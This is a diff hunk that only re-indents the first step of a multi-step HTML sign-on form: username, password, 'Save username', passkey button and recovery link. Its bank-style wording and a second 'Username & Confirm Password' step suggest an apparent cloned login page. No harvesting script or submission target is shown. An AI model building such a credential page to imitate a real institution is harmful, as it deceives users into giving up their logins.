@@ -445,52 +445,52 @@
         <!-- STEP 1: Username & Password -->
         <!-- ========================================== -->
         <div id="step1" class="step-container active">
-            <form id="form1" style="width:100%;">
-                <div class="form-group">
-                    <input type="text" id="loginUsername" class="input-field" placeholder="Username" required>
-                </div>
-
-                <div class="form-group">
-                    <div class="password-wrapper">
-                        <input type="password" id="password" class="input-field" placeholder="Password" required>
-                        <button type="button" class="toggle-password-btn" id="togglePassword">Show</button>
-                    </div>
-                </div>
-
-                <div class="checkbox-container">
-                    <input type="checkbox" id="save-username">
-                    <label for="save-username" class="checkbox-label">Save username</label>
-                </div>
-
-                <p class="security-note">
-                    To help keep your account secure, save your username only on devices that aren't used by other people.
-                </p>
-
-                <button type="submit" id="step1Btn" class="btn-sign-on">Continue</button>
-
-                <div id="status1" class="status-msg"></div>
-
-                <div class="divider-text" style="text-align: center;">or</div>
-
-                <button type="button" class="btn-passkey">
-                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                        <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
-                        <circle cx="12" cy="7" r="4"></circle>
-                    </svg>
-                    Use a passkey
-                </button>
-
-                <p class="passkey-note">
-                    Don't have one? Create a passkey after signing on and skip the password next time.
-                </p>
-
-                <div style="display: flex; justify-content: center; width: 100%;">
-                    <a href="#" class="forgot-link">
-                        <span style="font-size: 18px;">&rarr;</span> Forgot username or password?
-                    </a>
-                </div>
-            </form>
+    <form id="form1" style="width:100%;">
+        <div class="form-group">
+            <input type="text" id="loginUsername" class="input-field" placeholder="Username" required>
         </div>
+
+        <div class="form-group">
+            <div class="password-wrapper">
+                <input type="password" id="password" class="input-field" placeholder="Password" required>
+                <button type="button" class="toggle-password-btn" id="togglePassword">Show</button>
+            </div>
+        </div>
+
+        <div class="checkbox-container">
+            <input type="checkbox" id="save-username">
+            <label for="save-username" class="checkbox-label">Save username</label>
+        </div>
+
+        <p class="security-note">
+            To help keep your account secure, save your username only on devices that aren't used by other people.
+        </p>
+
+        <button type="submit" id="step1Btn" class="btn-sign-on">Continue</button>
+
+        <div id="status1" class="status-msg"></div>
+
+        <div class="divider-text" style="text-align: center;">or</div>
+
+        <button type="button" class="btn-passkey">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
+                <circle cx="12" cy="7" r="4"></circle>
+            </svg>
+            Use a passkey
+        </button>
+
+        <p class="passkey-note">
+            Don't have one? Create a passkey after signing on and skip the password next time.
+        </p>
+
+        <div style="display: flex; justify-content: center; width: 100%;">
+            <a href="#" class="forgot-link">
+                <span style="font-size: 18px;">&rarr;</span> Forgot username or password?
+            </a>
+        </div>
+    </form>
+</div>
 
         <!-- ========================================== -->
         <!-- STEP 2: Username & Confirm Password -->
